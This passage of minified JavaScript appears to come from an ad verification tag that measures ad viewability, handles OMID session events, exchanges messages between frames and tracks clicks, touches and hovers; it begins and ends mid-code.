      u && (We.execAtEndOfThread(g), !d && I.isDef(t.MutationObserver) && (a = new MutationObserver(function (e) {
        d ? a.disconnect() : We.execAtEndOfThread(function () {
          I(e).each(function (e, t) {
            if (t.addedNodes.length) {
              var n = t.addedNodes[0];
              n && Oe.isElement(n) && Oe.tagNameIs(n, "IFRAME") && I.debounce(g, 10);
            }
          });
        });
      })).observe(e.body, {
        attributes: !1,
        childList: !0,
        characterData: !1
      }));
    },
    ot = {
      name: "BS_InApp",
      dependencies: [],
      creator: function () {
        "use strict";

        var e = We.getWindow().document,
          t = e && e.body;
        T.getAggregator().request(x.MOBILE_APP).isMobileAppEnvironment() && t && st.isValidMobileAdSize(e.body) && it(e, "bs1", 3, 100);
      },
      settings: {
        tier: A.TIERS.VIEWABILITY,
        applies: function (e, t, n) {
          "use strict";

          var r = n.isOmid() || n.isMraid(),
            i = !n.isDomless() && n.friendly && !n.embedded;
          return e.on("bas") && r && i && e.bootstrapOn("app");
        }
      }
    },
    at = {
      name: "BS_Browser",
      dependencies: [],
      creator: function () {
        "use strict";

        var e = We.getWindow().document,
          t = e.body ? Math.round(Oe.getNodeArea(e.body)) : null;
        !T.getAggregator().request(x.MOBILE_APP).isMobileAppEnvironment() && t && it(e, "bs2", 10, t);
      },
      settings: {
        tier: A.TIERS.VIEWABILITY,
        applies: function (e, t, n) {
          "use strict";

          var r = !e.bootstrapOn("app") && !n.isDomless();
          return e.on("bbs") && n.embedded && r;
        }
      }
    };
  const st = {
    isValidMobileAdSize: e => {
      const t = Oe.getRect(e);
      return I([{
        width: 320,
        height: 50
      }, {
        width: 300,
        height: 250
      }, {
        width: 336,
        height: 280
      }, {
        width: 300,
        height: 250
      }, {
        width: 728,
        height: 90
      }, {
        width: 468,
        height: 60
      }, {
        width: 336,
        height: 280
      }]).find((e, n) => n.width === t.width && n.height === t.height);
    }
  };
  var ct = function () {
      "use strict";

      return {
        createInstance: function (e) {
          return Ae.isDomless() ? new dt() : new ut(e);
        }
      };
    },
    ut = function (e) {
      "use strict";

      var n,
        r,
        i,
        o = new j(),
        a = new K(),
        s = new Et(o),
        c = new ft(),
        u = new At(),
        d = new ht(o, e),
        g = function () {
          return I.isUndef(i) && (i = new mt(o)), i;
        };
      return {
        isApplicable: function (e) {
          return I.isDef(t.JSON) && I.isDef(t.postMessage) && (!e.isOmidNative() || e.isOmidForWeb());
        },
        start: function () {
          o.provide({
            frameCollection: function () {
              return s;
            },
            adProxy: function () {
              return u;
            },
            adTalkMessage: function (e) {
              return new gt(e, o);
            },
            adTalkMessageCollection: function () {
              return c;
            },
            idMapModule: g,
            interFrameQuerySelector: function (e) {
              return new It(e);
            }
          }), a.traverse(s.addFrame), d.startListening(), d.sendToKnownFrames(), T.getAggregator().once(F.STOP_AD_TALK, function () {
            d.stopListening();
          }), T.getAggregator().provide(x.AD_TALK_EVENT_AGGREGATOR, o);
        },
        sendAdTalkCall: d.sendAdTalkCall,
        getFrameMap: function () {
          return I.isUndef(n) && (n = new pt(o)), n;
        },
        getFrameMapIncludingPeerCase: function () {
          return I.isUndef(r) && (r = new pt(o, !0)), r;
        },
        getIdMap: g
      };
    };
  const dt = function () {
    "use strict";

    return {
      isApplicable: () => !1,
      start: () => {}
    };
  };
  var gt = function (t, n) {
      "use strict";

      var r,
        i = n.request(x.AD_PROXY).myIdCard,
        o = n.request(x.FRAME_COLLECTION).getMe().getStringifiedPosition();
      r = T.getAggregator().request(x.FEATURES).on("swapids") ? e.oid : e.asid;
      var a, s;
      return {
        messageContent: t || {},
        srcAsid: e.asid,
        srcTagId: i.tagId,
        srcIsEmbedded: Ae.embedded,
        srcIsFriendly: Ae.friendly,
        srcBirthdate: g.measurementConfig.birthdate,
        iasCommonId: r.split("-")[2],
        nodeSelector: Ae.friendly ? "[" + A.AD_IDENTIFIER + "-" + e.asid + "]" : 'iframe[src*="' + ((s = (a = We.getWindow()).location && a.location.href) && s.replace(/^https?\:\/\//i, "")) + '"]',
        positionStr: o,
        version: "0.1"
      };
    },
    ft = function () {
      "use strict";

      var e = {};
      return {
        add: function (t) {
          var n = t && t.srcAsid;
          n && (e[n] = t);
        },
        map: function (t) {
          return I(e).map(t);
        },
        has: function (t) {
          var n = t && t.srcAsid;
          return e[n];
        }
      };
    },
    lt = function (e, n, r, i) {
      "use strict";

      var o,
        a = e == t;
      (o = {
        position: n.slice(0),
        id: n.join("-"),
        isMe: a,
        isLeaf: !e.frames.length,
        adProxies: a ? r : [],
        selfDescription: void 0,
        unifiedId: g.measurementConfig.birthdate,
        srcIsEmbedded: i ? i.srcIsEmbedded : void 0,
        inbox: i ? [i] : []
      }).getDomObj = function () {
        return e;
      }, o.getStringifiedPosition = function () {
        return I(o.position).map(function (e, t) {
          return I.toBase(Number(t) + 1, 36);
        }).join("");
      }, o.isValidForMapping = function () {
        return o.isLeaf || o.isMe || I.isDef(o.selfDescription);
      };
      var s = function (e, t) {
        return !I(e).find(function (e, n) {
          return n.adSafeId && n.adSafeId === t.adSafeId;
        });
      };
      return o.addInformationFromSrc = function (e, t) {
        var n, r, i, a;
        n = t, r = o.adProxies, i = n.adProxies, a = [], r.length && i.length ? I(i).each(function (e, t) {
          s(r, t) && a.push(t);
        }) : a = i, o.adProxies = r.concat(a), function (e) {
          I(o.inbox).find(function (t, n) {
            return n.srcAsid && n.srcAsid === e.srcAsid;
          }) || o.inbox.push(e);
        }(e), o.srcIsEmbedded = e.srcIsEmbedded, o.selfDescription = t;
      }, o;
    },
    Et = function (e) {
      "use strict";

      var t = [],
        n = {},
        r = {
          noMe: !0
        };
      return {
        addFrame: function (i, o, a) {
          var s = e.request(x.AD_PROXY).getAll(),
            c = new lt(i, o, s, a);
          return t.push(c), n[c.id] = c, c.isMe && (r = c), c;
        },
        getFrame: function (e) {
          return n[e];
        },
        list: t,
        dictionary: n,
        getMe: function () {
          return r;
        }
      };
    },
    pt = function (t, n) {
      "use strict";

      var r = function (e, t) {
          var r = t.adProxies,
            a = "";
          if (t.isValidForMapping()) return a += n ? o(r, t.getStringifiedPosition()) : i(r, t);
        },
        i = function (e, t) {
          var n = "";
          return n += t.getStringifiedPosition(), n += t.isMe ? "*" : "", n += e.length ? "." + e[0].tagId : "";
        },
        o = function (e, t) {
          var n = "";
          return e.length ? n += I(e).stringify(function (e, n) {
            return a(n, t);
          }, "|") : n += t, n;
        },
        a = function (t, n) {
          return n + (e.asid === t.adSafeId ? "*" : "") + "." + t.tagId;
        };
      return {
        output: function () {
          var e = t.request(x.FRAME_COLLECTION),
            n = I(e.list).stringify(r, "|");
          return I.toBase(e.getMe().unifiedId, 62) + "+" + n;
        }
      };
    },
    mt = function (t) {
      "use strict";

      var n = t.request(x.FRAME_COLLECTION).getMe().getStringifiedPosition(),
        r = e.contextNode.parentNode,
        i = t.request(x.INTER_FRAME_QUERY_SELECTOR, r),
        o = function (e) {
          var t = !1,
            o = !Ae.embedded,
            a = "BODY" !== Oe.getNodeName(r) && "HEAD" !== Oe.getNodeName(r),
            s = e.srcIsEmbedded && !function (e) {
              var t = "0.1" !== e.version,
                n = e.nodeSelector && -1 === e.nodeSelector.indexOf(A.AD_IDENTIFIER);
              return t ? n : !e.srcIsFriendly;
            }(e);
          return t = o && a && !s ? !!function (e) {
            return i.queryFor(e.nodeSelector);
          }(e) : !!function (e) {
            var t = e.positionStr,
              r = e.srcIsEmbedded && Ae.embedded,
              i = 0 === n.indexOf(t) || 0 === t.indexOf(n);
            return r && i;
          }(e), t;
        };
      return {
        output: function () {
          var r,
            i,
            a = n + "*";
          return (i = t.request(x.AD_TALK_MESSAGE_COLLECTION).map(function (t, n) {
            var r;
            return t !== e.asid && o(n) && (r = function (e) {
              return e.positionStr + "." + e.srcAsid + "." + e.transferDuration + "_" + e.srcTagId;
            }(n)), r;
          })).push(a), r = i.join("|"), r.length > 120 && (r = function (e) {
            return e && e.substr(0, 120) + ".of" + e.length;
          }(r), T.getAggregator().trigger(F.STOP_AD_TALK)), r;
        },
        isCandidateForMyIdMap: o
      };
    },
    It = function (e) {
      "use strict";

      var t = new K(),
        n = function (e, t) {
          return Oe.querySelector(function (e) {
            var t = e,
              n = "IFRAME" === Oe.getNodeName(e),
              r = Oe.isWindow(e);
            return n ? t = e.contentWindow.document : r && (t = e.document), t;
          }(e), t);
        };
      return {
        queryFor: function (r) {
          var i = null;
          return r && (i = function (r, i) {
            var o, a, s;
            try {
              (a = n(r, i)) || (o = t.getFrames(!0, e), I(o).findFirst(function (e, t) {
                return s = n(t, i);
              }));
            } catch (e) {}
            return a || s || null;
          }(e, r)), i;
        }
      };
    },
    ht = function (t) {
      "use strict";

      var n,
        r,
        i = !1,
        o = T.getAggregator().request(x.FEATURES);
      r = o.on("swapids") ? e.oid : e.asid;
      var a = function (n) {
          var i = r.split("-")[2],
            o = !t.request(x.AD_TALK_MESSAGE_COLLECTION).has(n) && n.srcAsid !== e.asid;
          return n.hasOwnProperty("messageContent") && i === n.iasCommonId && o;
        },
        s = function () {
          var e = t.request(x.FRAME_COLLECTION).getMe(),
            n = {
              self: e,
              unifiedId: e.unifiedId
            };
          return t.request(x.AD_TALK_MESSAGE, n);
        },
        c = function () {
          var e = A.DT_CODES.ADTALK;
          t.request(x.FRAME_COLLECTION);
          i || (i = !0), T.getAggregator().trigger(F.SEND_DT, e);
        },
        u = function (e, n, r) {
          var o, a, s, u, d, g, f;
          try {
            o = t.request(x.FRAME_COLLECTION), a = t.request(x.AD_TALK_MESSAGE_COLLECTION), s = n.messageContent.self, a.add(n), g = o.getMe(), f = s, g.unifiedId > f.unifiedId && (g.unifiedId = f.unifiedId), n.transferDuration = function (e) {
              return We.now() - e.sentTime;
            }(n), u = o.getFrame(s.id), d = u, I.isUndef(d) || I.isUndef(d.selfDescription) ? ((u = u || o.addFrame(e.source, s.id.split("-"), n)).addInformationFromSrc(n, s), r()) : u.addInformationFromSrc(n, s), i && t.request(x.ID_MAP_MODULE).isCandidateForMyIdMap(n) && c();
          } catch (e) {
            T.getAggregator().trigger(F.ERROR, A.ERROR_CODES.ADTALK_DUBIOUS);
          }
        };
      return {
        sendAdTalkCall: c,
        sendToKnownFrames: function () {
          new Q().send(s);
        },
        startListening: function () {
          (n = new J()).listen(a, u, s);
        },
        stopListening: function () {
          n && n.stop();
        },
        validateMessage: a,
        processMessage: u,
        createMessage: s
      };
    },
    Tt = function () {
      "use strict";

      var e = T.getAggregator().request(x.IDS),
        t = e.getAsid();
      return {
        tagId: e.getFwId(),
        adSafeId: t
      };
    },
    At = function () {
      "use strict";

      var e,
        t = [],
        n = function (e) {
          var n = new Tt(e);
          return t.push(n), n;
        };
      return e = n(), {
        createNew: n,
        getAll: function () {
          return t;
        },
        myIdCard: e
      };
    },
    _t = function (e, t) {
      "use strict";

      var n,
        r,
        i = A.NA,
        o = i,
        a = !1,
        s = !1,
        c = !1,
        u = !t,
        d = T.getAggregator().request(x.BROWSER),
        g = function (e, t) {
          (function (e) {
            var t = T.getAggregator().request(x.MOBILE_APP);
            return (e.browserIs(A.BROWSERS.CHROME) || e.isAndroidWebViewBrowser() || e.browserIs(A.BROWSERS.WEBKIT) || e.browserIs(A.BROWSERS.MSEDGE)) && !t.isMobileAppEnvironment() && e.hasResizeObserver();
          })(d) && We.getResizeObserver(function (n, r) {
            var i = n.pop();
            i.contentRect.height * i.contentRect.width > 0 && (t.unobserve(e), t.observe(e), r.disconnect());
          }).observe(e);
        },
        f = function () {
          var t = We.getIntersectionObserver(function (e, t) {
            var r = e.pop(),
              a = r.intersectionRect.width * r.intersectionRect.height / (r.boundingClientRect.width * r.boundingClientRect.height) * 100;
            isNaN(a) && (g(r.target, t), a = 0), i = Math.min(a, 100), n = r.boundingClientRect, i !== o && We.execAtEndOfThread(function () {
              T.getAggregator().trigger(F.IO_PIV_CHANGE, i);
            }), o = i;
          }, {
            threshold: A.VIEWABILITY_IN_VIEW_THRESHOLDS_INTERSECTION_OBSERVER
          });
          u && We.execAtEndOfThread(function () {
            i === A.NA && (i = 0);
          }), t.observe(l(e)), u && We.execAtEndOfThread(function () {
            Ae.isBustedIframe() || T.getAggregator().trigger(F.DELAYED_VIEWABILITY_READY);
          }), a = !0;
        },
        l = function (t) {
          if (!I.isUndef(t)) {
            if (c) {
              var n = e.document,
                i = n.createElement("div");
              I(i.style).mixin({
                position: "absolute",
                width: "100%",
                opacity: "0",
                height: "100%",
                zIndex: -999,
                top: "0px",
                left: "0px"
              }), i[A.IAS_DETECTOR] = !0, n.body.appendChild(i), t = i;
            }
            return r = t, t;
          }
        };
      return {
        start: function () {
          var t = function () {
            var t;
            try {
              e.document && (c = !0, t = {
                bodyElement: e.document.body,
                document: e.document
              });
            } catch (e) {
              s = !0;
            }
            return t;
          }();
          t && null !== t.bodyElement ? f() : t && t.document ? _e.whenReady(f, t.document) : s ? T.getAggregator().request("errors").add(A.ERROR_CODES.BUSTED_IFRAME_IN_IO) : f();
        },
        isReady: function () {
          return i !== A.NA;
        },
        isStarted: function () {
          return a;
        },
        getAdNodeDimensions: function () {
          var e;
          return n && (e = Se({
            scrX: void 0,
            scrY: void 0,
            width: n.width,
            height: n.height
          })), e;
        },
        getObservedNode: function () {
          return r;
        },
        getPiv: function () {
          return i;
        }
      };
    },
    Dt = function () {
      "use strict";

      var e = !1;
      return _e.whenReady(function () {
        T.getAggregator().trigger(F.START_VIEWABILITY_LOOP), e = !0;
      }), {
        loopStarted: function () {
          return e;
        }
      };
    },
    vt = {
      name: "loopDelay",
      dependencies: [],
      creator: Dt,
      settings: {
        applies: function (e, t, n) {
          "use strict";

          return e.bootstrapOn("allowViewability");
        },
        tier: A.TIERS.VIEWABILITY
      }
    },
    St = function () {
      "use strict";

      return {
        start: function (e) {
          T.getAggregator().on(F.MEASURABLE, function () {
            e();
          });
        },
        isApplicable: function (e, t) {
          return !t.browserIs(A.BROWSERS.WEBKIT) || !e.isImmediatelyMeasurable();
        }
      };
    },
    Ot = function () {
      "use strict";

      return {
        start: function (e) {
          e();
        },
        isApplicable: function (e) {
          return e.isImmediatelyMeasurable();
        }
      };
    },
    Rt = function (t, n, r) {
      "use strict";

      var i = !1,
        o = function () {
          try {
            n.impressionIsIdentifiable() && !i ? (i = !0, T.getAggregator().trigger(F.NOTIFY, e._onMeasurable)) : n.impressionIsIdentifiable() || __IntegralASDiagnosticCall("rtsmeas_imp_not_iden", {}, e);
          } catch (t) {
            __IntegralASDiagnosticCall("rtsmeas_send_noti_error", t, e);
          }
        };
      return {
        start: function () {
          try {
            var n,
              i = [yt(), Nt(), Ot(), St()];
            (n = I(i).findFirst(function (e, n) {
              return n.isApplicable(r, t);
            })) ? n.start(o) : __IntegralASDiagnosticCall("rtsmeas_no_chosen_strategy", {}, e);
          } catch (t) {
            __IntegralASDiagnosticCall("rtsmeas_start_error", t, e);
          }
        },
        isApplicable: function (t) {
          return t.bootstrapOn("useViewabilityNotification") && I.isDef(e._onMeasurable);
        }
      };
    },
    Nt = function () {
      "use strict";

      return {
        start: function (e) {
          var t, n;
          (t = T.getAggregator(), n = [F.AD_IMPRESSION, F.MEASURABLE], {
            onAll: function (e) {
              var r = {};
              I(n).each(function (i, o) {
                t.on(o, function () {
                  r[o] = 1, I(r).keys().length === n.length && (r = {}, e());
                });
              });
            }
          }).onAll(function () {
            e();
          });
        },
        isApplicable: function (e, t) {
          var n = t.getIOSVersion() >= 9;
          return (!t.browserIs(A.BROWSERS.WEBKIT) || n) && Ae.isVideo();
        }
      };
    },
    yt = function () {
      "use strict";

      return {
        start: function (e) {
          T.getAggregator().once(F.AD_IMPRESSION, function () {
            e();
          });
        },
        isApplicable: function (e) {
          return e.isImmediatelyMeasurable() && Ae.isVideo();
        }
      };
    },
    Ct = function (e, t, n) {
      "use strict";

      var r = ["rjss", "jss", "jload"];
      return {
        accepts: function () {
          var e = I.isDef(I(r).find(function (e, t) {
            return t === n;
          }));
          return t.accepts() && t.isMediaType(A.MEDIA_TYPE.DISPLAY) && e;
        },
        isImmediate: function () {
          return !0;
        },
        isMediaType: t.isMediaType,
        supportsAdContainerGeometry: function () {
          return t.supportsAdContainerGeometry();
        },
        start: function () {}
      };
    },
    Mt = function (t) {
      "use strict";

      var n = We.getWindow(),
        r = n && n.omid3p,
        i = T.getAggregator().request(x.OMID_AD_SESSION_CONTEXT),
        o = !!(t && t.isSupported && t.isSupported()),
        a = !!(r && I.isFunction(r.registerSessionObserver) && I.isFunction(r.addEventListener));
      return {
        accepts: function () {
          return (o || a) && !e.videoId;
        },
        isMediaType: function (e) {
          return e === i.mediaType;
        },
        supportsAdContainerGeometry: function () {
          return !0;
        }
      };
    },
    wt = function (e, t, n) {
      "use strict";

      var r,
        i = T.getAggregator().request(x.OMID_AD_SESSION_CONTEXT),
        o = i.isHtml && i.isWeb,
        a = We.getWindow(),
        s = a && a.omid3p,
        c = !!(s && I.isFunction(s.registerSessionObserver) && I.isFunction(s.addEventListener)) ? s : e;
      r = o ? ["rjss", "jss", "jload", "jsvid", "fwjsvid"] : ["rjss", "jss", "jload"];
      return {
        accepts: function () {
          var e = I.isDef(I(r).find(function (e, t) {
            return t === n;
          }));
          return t.accepts() && t.isMediaType(A.MEDIA_TYPE.VIDEO) && e;
        },
        isImmediate: function () {
          return !0;
        },
        isMediaType: t.isMediaType,
        supportsAdContainerGeometry: function () {
          return t.supportsAdContainerGeometry();
        },
        start: function () {
          c.addEventListener("start", function (e) {
            T.getAggregator().trigger(F.AD_IMPRESSION);
          });
        }
      };
    },
    bt = function (e) {
      "use strict";

      return {
        resolve: function () {
          return I(e).findFirst(function (e, t) {
            return t.environment.accepts();
          });
        }
      };
    },
    Pt = function (n) {
      "use strict";

      var r = !1,
        i = !1,
        o = !1,
        a = !1,
        s = T.getAggregator().request(x.OMID_AD_SESSION_CONTEXT);
      s.queuedOutputItems = [], s.cachedEvents = [], s.cachedGeometryEventsReceived = !1, s.cachedVideoEventsReceived = !1, s.recoveredTime = -1;
      var c = new Ar(),
        u = T.getAggregator().request(x.OMID_AS_VERIFICATION_PARAMS),
        d = T.getAggregator().request(x.FEATURES),
        f = We.getWindow(),
        l = f && f.omid3p,
        E = !!(l && I.isFunction(l.registerSessionObserver) && I.isFunction(l.addEventListener)) ? l : n,
        p = !1;
      s.omidEarlyExit = !1, s.mediaType = "display";
      var h = !1,
        _ = function (e, t) {
          s.queuedOutputItems.push({
            code: e,
            value: t
          });
        },
        D = function (e, t, n) {
          T.getAggregator().trigger(e, t, n);
        },
        v = function (e) {
          T.getAggregator().trigger(e);
        },
        S = function () {
          r && i && (!a || o) && (t.omidSupported = !0, s.hasOwnProperty("impressionType") && _("oiet", s.impressionType), s.hasOwnProperty("creativeType") && _("oct", s.creativeType), s.underEvaluation && _("oef", !0), s.exitedOASRS = !0, p = !0, g && g.jsConfigRequest && g.jsConfigRequest.buildRequestUrlFromParameters && g.jsConfigRequest.buildRequestUrlFromParameters({
            contextNode: g.scriptTag,
            omidParameters: u && u.IAS && Object.keys(u.IAS).length > 0 ? u.IAS : u
          }), m());
        },
        O = function (t) {
          function n() {
            return Ae.isOmidForWeb() || t.data.hasOwnProperty("supportsLoadedEvent") && ("true" === t.data.supportsLoadedEvent || !0 === t.data.supportsLoadedEvent) && "string" == typeof t.data.creativeType && "" !== t.data.creativeType;
          }
          var c = "0";
          if ("sessionStart" === t.type) {
            s.adSessionType = t.data.context.adSessionType || "undefined", s.environment = t.data.context.environment, s.accessMode = t.data.context.accessMode || "limited", s.omidNativeInfo = t.data.context.omidNativeInfo, s.omidJsInfo = t.data.context.omidJsInfo, s.deviceInfo = t.data.context.deviceInfo, s.app = t.data.context.app, s.supports = t.data.context.supports, s.app && "string" == typeof s.app.appId && s.app.appId.toLowerCase().indexOf("pandora") > -1 && (s.ignoreDivAsCandidate = !0), t.data.hasOwnProperty("contentUrl") && (s.contentUrl = t.data.contentUrl), t.data.context.hasOwnProperty("underEvaluation") && (s.underEvaluation = t.data.context.underEvaluation), s.isJavaScript = "javascript" === s.adSessionType, s.isNative = "native" === s.adSessionType || "javascript" === s.adSessionType, s.isLimitedSandbox = "app" === s.environment ? Ae.embedded : "full" !== t.data.context.accessMode, s.isHtml = "html" === t.data.context.adSessionType, s.isWeb = "web" === t.data.context.environment, s.partnerName = s.omidNativeInfo && s.omidNativeInfo.partnerName && s.omidNativeInfo.partnerName.toLowerCase(), u = t.data.verificationParameters, s.isOmidForWebEnvironment = s.isHtml && s.isWeb, s.element = t.data.context.videoElement || t.data.context.slotElement || null, n() ? (a = !0, s.useOMID13Logic = !0, _("ohand", "13"), E.addEventListener("video", N), E.addEventListener("media", N)) : _("ohand", "12"), s.isOmidForWebEnvironment || (s.integratedBlocking = g.measurementConfig.isResolved && Ae.integratedBlockingApplies(e.mobFwUrl), s.integratedBlocking && d && d.on("exitOASRSEarly") && (s.omidEarlyExit = !0, c = "1", s.omidEarlyExit && e.mobFwUrl.indexOf("xmtp=v") > -1 && (s.mediaType = "video")), !t.data.mediaType || "display" !== t.data.mediaType && "video" !== t.data.mediaType || (s.mediaType = t.data.mediaType)), s.omidEarlyExit && (i = !0, _("omtp", s.mediaType), n() && (o = !0), "video" === s.mediaType && (s.isVideo = !0), s.isNativeVideo = s.isNative && s.isVideo, s.isDisplay = "display" === s.mediaType), "audio" === t.data.creativeType && (s.accessMode = "limited", s.isLimitedSandbox = !0);
            for (var f, l, m, I = [{
                root: "omidNativeInfo",
                code: "onpn",
                field: "partnerName"
              }, {
                root: "omidNativeInfo",
                code: "onpv",
                field: "partnerVersion"
              }, {
                root: "omidJsInfo",
                code: "ojpn",
                field: "partnerName"
              }, {
                root: "omidJsInfo",
                code: "ojpv",
                field: "partnerVersion"
              }, {
                root: "omidJsInfo",
                code: "osev",
                field: "serviceVersion"
              }, {
                root: "omidJsInfo",
                code: "oscv",
                field: "sessionClientVersion"
              }, {
                root: "app",
                code: "applv",
                field: "libraryVersion"
              }, {
                root: "app",
                code: "appid",
                field: "appId"
              }, {
                root: "deviceInfo",
                code: "dty",
                field: "deviceType"
              }, {
                root: "deviceInfo",
                code: "osn",
                field: "os"
              }, {
                root: "deviceInfo",
                code: "osv",
                field: "osVersion"
              }], h = 0; h < I.length; h++) f = I[h].root, l = I[h].field, m = I[h].code, "object" == typeof s[f] && void 0 !== s[f][l] && _(m, s[f][l]);
            _("oast", s.adSessionType), _("oacm", s.accessMode), _("oenv", s.environment), s.hasOwnProperty("contentUrl") && _("ocon", encodeURIComponent(s.contentUrl || "")), _("oerl", c), _("oses", Ae.getTagTime()), r = !0, S();
          }
          if ("sessionError" === t.type) {
            var T = "string" == typeof t.data.errorType ? t.data.errorType : "NoErrType",
              A = "string" == typeof t.data.message ? t.data.message : "NoMessage",
              v = T + "_" + encodeURIComponent(A);
            p ? D(F.ADD_OUTPUT_ITEM, {
              output: v
            }, W.OMID_SESSION_ERROR) : _(W.OMID_SESSION_ERROR, v);
          }
        },
        R = function (e) {
          e.type === A.IMPRESSION_EVENT && (s.omidImpressionArrived = !0, v(F.OMID_IMPRESSION_ARRIVED), s.mediaType = "web" === s.environment ? e.data.mediaType || "video" : e.data.mediaType, _("omtp", s.mediaType), "audio" === e.data.creativeType && (s.accessMode = "limited", s.isLimitedSandbox = !0), _("oimp", Ae.getTagTime()), "video" === e.data.mediaType && (s.isVideo = !0), function (e) {
            return e.data.adView && (e.data.viewport || s.isWeb);
          }(e) && (s.impressionViewabilityMeasurement = {
            type: "geometryChange",
            data: {
              viewport: e.data.viewport,
              adView: e.data.adView
            },
            timestamp: e.timestamp
          }, void 0 === s.geometryArrived && c.checkForViewAttachmentBasedOnAdSessionType(s, e.data.adView) && (s.geometryArrived = !0, v(F.OMID_REND_GEO_UPDATE))), e.data.hasOwnProperty("impressionType") && !o && (s.impressionType = e.data.impressionType), s.isNativeVideo = s.isNative && "video" === e.data.mediaType, s.isDisplay = "display" === e.data.mediaType, i = !0, S());
        },
        N = function (e) {
          if (e && "start" === e.type) return s.videoStartArrived = !0, void v(F.OMID_REND_VIDEO_START);
          "loaded" !== e.type || s.omidLoadedArrived || (_("oloa", Ae.getTagTime()), o = !0, s.omidLoadedArrived = !0, v(F.OMID_LOADED_ARRIVED), e.data.hasOwnProperty("creativeType") && (s.creativeType = e.data.creativeType), "audio" === s.creativeType && (s.accessMode = "limited", s.isLimitedSandbox = !0), e.data.hasOwnProperty("impressionType") && (s.impressionType = e.data.impressionType), !0 === s.omidEarlyExit && (h || (D(F.ADD_THROTTLED_OUTPUT_ITEM, "oiet", s.impressionType), D(F.ADD_THROTTLED_OUTPUT_ITEM, "oct", s.creativeType), h = !0)), S());
        },
        y = function (e) {
          e && e.data && e.data.interactionType && "click" === e.data.interactionType && Ht.omid.trackClick();
        };
      return {
        start: function () {
          E.registerSessionObserver(O, "IAS"), E.addEventListener(A.IMPRESSION_EVENT, R), E.addEventListener(F.AD_USER_INTERACTION, y);
        }
      };
    },
    Vt = function () {
      "use strict";

      return {
        accepts: function () {
          return !0;
        }
      };
    },
    Lt = function () {
      "use strict";

      var e = T.getAggregator().request(x.OMID_AD_SESSION_CONTEXT),
        t = T.getAggregator().request(x.OMID_VERIFICATION_CLIENT),
        n = new Mt(t),
        r = e.isHtml && e.isWeb;
      return {
        accepts: function () {
          return n.accepts() && r;
        }
      };
    },
    Ft = function () {
      "use strict";

      return {
        start: function () {
          m();
        }
      };
    };
  const Ut = ({
    jsInfoCode: e,
    output: t,
    errorCode: n
  }) => {
    try {
      T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
        output: t
      }, e), T.getAggregator().trigger(F.SEND_DT, A.DT_CODES.PERFORMANCE);
    } catch (e) {
      T.getAggregator().trigger(F.ERROR, n);
    }
  };
  class xt {
    constructor({
      tagStartTime: e
    }) {
      this.initClickTracking = ({
        clickSource: e
      }) => {
        this.clickData[e] || (this.clickData[e] = []);
      }, this.getClicks = ({
        clickSource: e
      }) => this.clickData[e], this.setupTrackAndBroadcastClick = ({
        clientX: e,
        clientY: t,
        clickSource: n
      }) => {
        const r = [e, t, Ae.getTagTime()];
        this.getClicks({
          clickSource: n
        }).push(r), Ut({
          output: I(this.clickData).toION(),
          errorCode: "Q",
          jsInfoCode: "clks"
        });
      }, this.trackClick = ({
        event: e,
        clickSource: t
      }) => {
        const {
          clientX: n,
          clientY: r
        } = e;
        this.setupTrackAndBroadcastClick({
          clientX: n,
          clientY: r,
          clickSource: t
        });
      }, this.trackTouch = ({
        touchEvent: e,
        clickSource: t
      }) => {
        const {
          clientX: n,
          clientY: r
        } = {
          clientX: Math.round(e.clientX),
          clientY: Math.round(e.clientY)
        };
        this.setupTrackAndBroadcastClick({
          clientX: n,
          clientY: r,
          clickSource: t
        });
      }, this.trackOmidClick = () => {
        this.initClickTracking({
          clickSource: "om"
        }), this.trackClick({
          event: {
            clientX: 0,
            clientY: 0
          },
          clickSource: "om"
        });
      }, this.trackAdComponentClick = e => {
        this.initClickTracking({
          clickSource: "ac"
        }), this.trackClick({
          event: e,
          clickSource: "ac"
        });
      }, this.trackMobileTouch = e => {
        if (e.changedTouches && e.changedTouches[0]) {
          const t = e.changedTouches[0];
          this.initClickTracking({
            clickSource: "mt"
          }), this.trackTouch({
            touchEvent: t,
            clickSource: "mt"
          });
        }
      }, this.clickData = {}, this.tagStartTime = e;
    }
  }
  class Wt {
    constructor({
      tagStartTime: e
    }) {
      this.trackAdComponentMouseOver = () => {
        this.hoverData.timeToFirstHover || (this.hoverData.timeToFirstHover = Ae.getTagTime()), this.hoverData.hoverCount += 1, this.hoverTimer.startTimer(), Ut({
          output: I(this.hoverData.getData()).toION(),
          errorCode: "he",
          jsInfoCode: "hov"
        });
      }, this.trackAdComponentMouseOut = () => {
        const e = this.hoverTimer.endTimer();
        (e || 0 === e) && (this.hoverData.totalHoverTime += e, Ut({
          output: I(this.hoverData.getData()).toION(),
          errorCode: "he",
          jsInfoCode: "hov"
        }));
      }, this.tagStartTime = e, this.hoverData = new Bt(), this.hoverTimer = new Gt();
    }
  }
  class Bt {
    constructor() {
      this.getData = () => [this.timeToFirstHover, this.hoverCount, this.totalHoverTime], this.hoverCount = 0, this.totalHoverTime = 0, this.timeToFirstHover = 0;
    }
  }
  class Gt {
    constructor() {
      this.startTime = 0;
    }
    startTimer() {
      this.startTime = new Date().getTime();
    }
    endTimer() {
      let e;
      return this.startTime && (e = new Date().getTime() - this.startTime), this.startTime = 0, e;
    }
  }
  const {
      birthdate: kt
    } = e,
    Ht = new class {
      constructor({
        tagStartTime: e
      }) {
        this.finalizeAllCollectedData = () => {
          this.hover.trackAdComponentMouseOut();
        }, this.tagStartTime = e, this.click = new xt({
          tagStartTime: e
        }), this.hover = new Wt({
          tagStartTime: e
        });
      }
      get adComponent() {
        return {
          trackClick: this.click.trackAdComponentClick,
          trackMouseOver: this.hover.trackAdComponentMouseOver,
          trackMouseOut: this.hover.trackAdComponentMouseOut
        };
      }
      get mobile() {
        return {
          trackTouch: this.click.trackMobileTouch
        };
      }
      get omid() {
        return {
          trackClick: this.click.trackOmidClick
        };
      }
    }({
      tagStartTime: kt
    });
  var Yt = function (e, n) {
      "use strict";

      var r = "videoPlaybackEvent",
        i = [],
        o = new Date().getTime(),
        a = 0,
        s = 1,
        c = 0,
        u = !1,
        d = new Fe(),
        f = T.getAggregator().request(x.OMID_AD_SESSION_CONTEXT),
        l = We.getWindow(),
        E = l && l.omid3p,
        p = !!(E && I.isFunction(E.registerSessionObserver) && I.isFunction(E.addEventListener)) ? E : e,
        m = !1,
        h = !1,
        _ = {
          isEmpty: function () {
            return 0 === i.length;
          },
          toString: function () {
            for (var e = "{vEventCount:" + i.length + ",vEvents:[", t = 0; t < i.length; t++) {
              var n = i[t];
